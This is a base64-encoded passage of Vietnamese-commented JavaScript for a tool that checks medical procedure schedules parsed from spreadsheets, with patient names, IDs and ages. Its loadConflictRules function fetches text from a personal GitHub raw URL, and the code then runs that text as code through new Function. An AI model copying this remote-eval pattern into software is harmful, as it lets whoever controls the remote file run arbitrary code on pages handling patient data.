KCdUaOG7pyB0aHXhuq10IGNow61uaCcpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChtaXNzaW5nQ29sdW1ucy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihgS2jDtG5nIHTDrG0gdGjhuqV5IGPDoWMgY+G7mXQgYuG6r3QgYnXhu5ljOiAke21pc3NpbmdDb2x1bW5zLmpvaW4oJywgJyl9YCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNvbnN0IHJvd3MgPSBkYXRhLnNsaWNlKDkpOw0KICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBjb25zdCBoZXJiUHJvY2VkdXJlcyA9IFtdOw0KICAgICAgICAgICAgICAgIGxldCBza2lwcGVkUm93cyA9IDA7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgcm93cy5mb3JFYWNoKChyb3csIGluZGV4KSA9PiB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHJvd051bWJlciA9IGluZGV4ICsgMTA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFyb3cgfHwgcm93Lmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdEw7JuZyB0cuG7kW5nJywgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1twcm9jZWR1cmVJbmRleF07DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcHJvY2VkdXJlTmFtZSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNraXBwZWRSb3dzKys7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcihgVGjhu6cgdGh14bqtdCBraMO0bmcgbuG6sW0gdHJvbmcgZGFuaCBzw6FjaCBraeG7g20gdHJhOiAke3Byb2NlZHVyZU5hbWV9YCwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0uc2tpcCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlcmJQcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dJbmRleDogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydD8uc2Vjb25kcyB8fCAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZD8uc2Vjb25kcyB8fCAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0Py5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXN0YXJ0IHx8ICFlbmQpIHsNCiAgIA0KICAgIHNraXBwZWRSb3dzKys7DQogICAgcmV0dXJuOw0KfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3RhcnQuZGF0ZUtleSAhPT0gZW5kLmRhdGVLZXkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignVGjhu6cgdGh14bqtdCBi4bqvdCDEkeG6p3UgdsOgIGvhur90IHRow7pjIGtow6FjIG5nw6B5Jywgcm93TnVtYmVyLCB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0RGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kRGF0ZTogZW5kLmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQkJCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQkJCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGVuZC5zZWNvbmRzIDw9IHN0YXJ0LnNlY29uZHMpIHsNCiAgICBsb2dFcnJvcignVGjhu51pIGdpYW4ga+G6v3QgdGjDumMgcGjhuqNpIHNhdSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3UnLCByb3dOdW1iZXIsIHsNCiAgICAgICAgc3RhcnRUaW1lOiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgZW5kVGltZTogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICBzdGFydFZhbHVlOiByb3dbc3RhcnRJbmRleF0sDQogICAgICAgIGVuZFZhbHVlOiByb3dbZW5kSW5kZXhdLA0KICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICBuZ2F5VGh1Y0hpZW46IGRhdGVJbmRleCAhPT0gLTEgPyByb3dbZGF0ZUluZGV4XSA6ICdLaMO0bmcgeMOhYyDEkeG7i25oJw0KICAgIH0pOw0KICAgIHNraXBwZWRSb3dzKys7DQogICAgcmV0dXJuOw0KfQ0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBleHBlY3RlZER1cmF0aW9uID0gUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXT8uZHVyYXRpb24gfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGFjdHVhbER1cmF0aW9uTWludXRlcyA9IChlbmQuc2Vjb25kcyAtIHN0YXJ0LnNlY29uZHMpIC8gNjA7DQogICAgICAgICAgICAgICAgICAgICAgICANCmxldCBkdXJhdGlvbkRpZmYgPSBNYXRoLmFicyhhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgLSBleHBlY3RlZER1cmF0aW9uKTsNCmxldCBpc0RvY3RvciA9IChzZXNzaW9uU3RvcmFnZS5nZXRJdGVtKCdtZWRVc2VyJykgfHwgJycpLnRvTG93ZXJDYXNlKCkgPT09ICdkb2N0b3InOw0KDQppZiAoDQogICAgZXhwZWN0ZWREdXJhdGlvbiA+IDAgJiYNCiAgICAoDQogICAgICAgIChpc0RvY3RvciAmJiBkdXJhdGlvbkRpZmYgPj0gMSkgfHwgICAvLyDinJQgdMOgaSBraG/huqNuIGRvY3Rvcg0KICAgICAgICAoIWlzRG9jdG9yICYmIGR1cmF0aW9uRGlmZiA+IDEpICAgICAgLy8g4pyUIHTDoGkga2hv4bqjbiBraMOhYw0KICAgICkNCikgew0KICAgIGxvZ0Vycm9yKGBgLCByb3dOdW1iZXIsIHsNCiAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KICAgICAgICBleHBlY3RlZDogZXhwZWN0ZWREdXJhdGlvbiwNCiAgICAgICAgYWN0dWFsOiBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMsDQogICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQlwYXRpZW50QWdlOiBwYXRpZW50YWdlSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRhZ2VJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdID8gcm93W29wZXJhdG9ySW5kZXhdLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICBuZ2F5VGh1Y0hpZW46IGRhdGVJbmRleCAhPT0gLTEgPyByb3dbZGF0ZUluZGV4XSA6ICdLaMO0bmcgeMOhYyDEkeG7i25oJywNCiAgICAgICAgc3RhcnRUaW1lOiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgZW5kVGltZTogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICBkb2N0b3I6IHJvd1tkb2N0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnIC8vIFRow6ptIGTDsm5nIG7DoHkNCiAgICB9KTsNCn0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocHJvY2VkdXJlTmFtZSA9PT0gJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVyYlByb2NlZHVyZXMucHVzaChwcm9jZWR1cmVzW3Byb2NlZHVyZXMubGVuZ3RoIC0gMV0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByb3dJbmRleDogcm93TnVtYmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQoJCQkJCQkJZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDogZW5kLnNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmxpY3Q6IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0UmVhc29uOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb246ICcnDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSB44butIGzDvSBkw7JuZzogJHtlcnJvci5tZXNzYWdlfWAsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcm93W3Byb2NlZHVyZUluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3JEZXRhaWxzOiBlcnJvci5zdGFjaw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignS2jDtG5nIGPDsyB0aOG7pyB0aHXhuq10IG7DoG8gaOG7o3AgbOG7hyDEkeG7gyBraeG7g20gdHJhLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBk4buvIGxp4buHdS4nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY2hlY2tDb25mbGljdHMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcyk7DQoJCQkJIC8vID09PSBUSMOKTSAzIETDkk5HIENoZWNrIG3DoyBtw6F5ID09PQ0KICAgICAgICBjaGVja01hY2hpbmVFcnJvcnMocHJvY2VkdXJlcywgZGF0YSk7DQogICAgICAgIGNoZWNrTWFjaGluZUNvbmZsaWN0cyhwcm9jZWR1cmVzLCBkYXRhKTsNCgkJY2hlY2tNaXNzaW5nTWFjaGluZUNvZGVzKHByb2NlZHVyZXMsIGRhdGEpOyANCiAgICAgICAgLy8gPT09IEvhur5UIFRIw5pDIFRIw4pNID09PQ0KICAgICAgICAgICAgICAgIGRpc3BsYXlSZXN1bHRzKHByb2NlZHVyZXMsIHNraXBwZWRSb3dzKTsNCiAgICAgICAgICAgICAgICB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgPSBoZXJiUHJvY2VkdXJlczsNCgkJCQkvLyAtLS0gQ+G6rXAgbmjhuq10IHPhu5EgY2Ega2jDoWMgxJFhIHPhu5EgdHLDqm4gbsO6dCAtLS0NCnNldFRpbWVvdXQoKCkgPT4gew0KICBpZiAodHlwZW9mIHVwZGF0ZUhlcmJCdXR0b25XaXRoT3V0bGllckNvdW50ID09PSAnZnVuY3Rpb24nKSB7DQogICAgdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQoKTsNCiAgfQ0KfSwgMTAwKTsNCg0KICAgICAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCgkJCQkgDQogICAgICAgIC8vID09PSBUSMOKTSAzIETDkk5HIGNoZWNrIG3DoyBtw6F5ID09PQ0KICAgICAgICBkaXNwbGF5TWFjaGluZUVycm9ycygpOw0KICAgICAgICBkaXNwbGF5TWFjaGluZUNvbmZsaWN0cygpOw0KCQlkaXNwbGF5TWlzc2luZ01hY2hpbmVFcnJvcnMoKTsNCiAgICAgICAgLy8gPT09IEvhur5UIFRIw5pDIFRIw4pNID09PQ0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihlcnJvci5tZXNzYWdlLCBudWxsLCBlcnJvci5zdGFjayk7DQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIHjhu60gbMO9IGThu68gbGnhu4d1OiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQpsZXQgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsNCg0KYXN5bmMgZnVuY3Rpb24gbG9hZENvbmZsaWN0UnVsZXMoKSB7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3hsdGh1dGh1YXQudHh0P3RzPScgKyBEYXRlLm5vdygpOw0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdOG6o2kgxJHGsOG7o2MgY2hhdV94bHRodXRodWF0LnR4dCcpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9IChhd2FpdCByZXMudGV4dCgpKS50cmltKCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSB04bqjaSBjaGF1X3hsdGh1dGh1YXQudHh0OicsIGUpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9ICcnOyAvLyBmYWxsYmFjazogcuG7l25nIC0+IGNvaSBuaMawIGtow7RuZyBjw7Mgbmdv4bqhaSBs4buHDQogICAgfQ0KfQ0KDQoNCg0KDQogICAgICAgIGZ1bmN0aW9uIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgICAgICAgICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgICAgICAgICANCiAgICAgICAgICAgIHByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICAgICAgICAgIGlmICghZ3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBPYmplY3QudmFsdWVzKGdyb3VwcykuZm9yRWFjaChncm91cCA9PiB7DQogICAgICAgICAgICAgICAgZ3JvdXAuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgZ3JvdXAubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldiA9IGdyb3VwW2kgLSAxXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IGdyb3VwW2ldOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2RW5kV2l0aEJ1ZmZlciA9IHByZXYuZW5kICsgKHByZXYucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBpc0FkamFjZW50ID0gaWdub3JlQWRqYWNlbnQgJiYgY3VycmVudC5zdGFydCA9PT0gcHJldi5lbmQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXZFbmRXaXRoQnVmZmVyICYmICFpc0FkamFjZW50KSB7DQogICAgICAgICAgICAgICAgIA0KDQpsZXQgaXNDb25mbGljdCA9IHRydWU7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKGNvbmZsaWN0UnVsZXNUZXh0ICYmIGNvbmZsaWN0UnVsZXNUZXh0LnRyaW0oKSkgew0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb25kaXRpb24gPSBuZXcgRnVuY3Rpb24oJ3ByZXYnLCdjdXJyZW50JywncmV0dXJuICcgKyBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpOw0KICAgICAgICAgICAgLy8gY29uZmxpY3RDb25kaXRpb24oKSBUUuG6oiBW4buAIHRydWUgbuG6v3UgKsSRxrDhu6NjIG1p4buFbiB4dW5nIMSR4buZdCoNCiAgICAgICAgICAgIGNvbnN0IGFsbG93ZWQgPSBjb25mbGljdENvbmRpdGlvbihwcmV2LCBjdXJyZW50KTsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSAhYWxsb3dlZDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOyAvLyBraMO0bmcgY8OzIHJ1bGUgLT4gY+G7qSBiw6FvIHh1bmcgxJHhu5l0DQogICAgICAgIH0NCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSRw6FuaCBnacOhIHh1bmcgxJHhu5l0IHRo4budaSBnaWFuOicsIGVycik7DQogICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzQ29uZmxpY3QpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0UmVhc29uID0gYCR7cHJldi5wcm9jZWR1cmV9PGJyPuKAoiBC4buHbmggbmjDom46ICR7cHJldi5wYXRpZW50TmFtZX08YnI+4oCiIE5nw6B5OiAke3ByZXYuZGF0ZX08YnI+4oCiIFRo4budaSBnaWFuOiAke3ByZXYuZGlzcGxheVN0YXJ0fS0ke3ByZXYuZGlzcGxheUVuZH1gOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFwcmV2LmNvbmZsaWN0UmVhc29uLmluY2x1ZGVzKGN1cnJlbnQucHJvY2VkdXJlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2LmNvbmZsaWN0UmVhc29uICs9IChwcmV2LmNvbmZsaWN0UmVhc29uID8gJzxicj48YnI+JyA6ICcnKSArIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYCAke2N1cnJlbnQucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke2N1cnJlbnQucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtjdXJyZW50LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtjdXJyZW50LmRpc3BsYXlTdGFydH0tJHtjdXJyZW50LmRpc3BsYXlFbmR9YDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQoNCi8vIEjDoG0ga2nhu4NtIHRyYSBn4bqvbiBzYWkgbcOheQ0KZnVuY3Rpb24gY2hlY2tNYWNoaW5lRXJyb3JzKHByb2NlZHVyZXMsIGpzb25EYXRhKSB7DQogICAgbWFjaGluZUVycm9yTG9nID0gW107DQogICAgDQogICAgY29uc3QgaGVhZGVyTGluZTEgPSBqc29uRGF0YVs3XSB8fCBbXTsNCiAgICBjb25zdCBoZWFkZXJMaW5lMiA9IGpzb25EYXRhWzhdIHx8IFtdOw0KICAgIGNvbnN0IGNvbWJpbmVkSGVhZGVycyA9IGhlYWRlckxpbmUxLm1hcCgoY29sLCBpbmRleCkgPT4gDQogI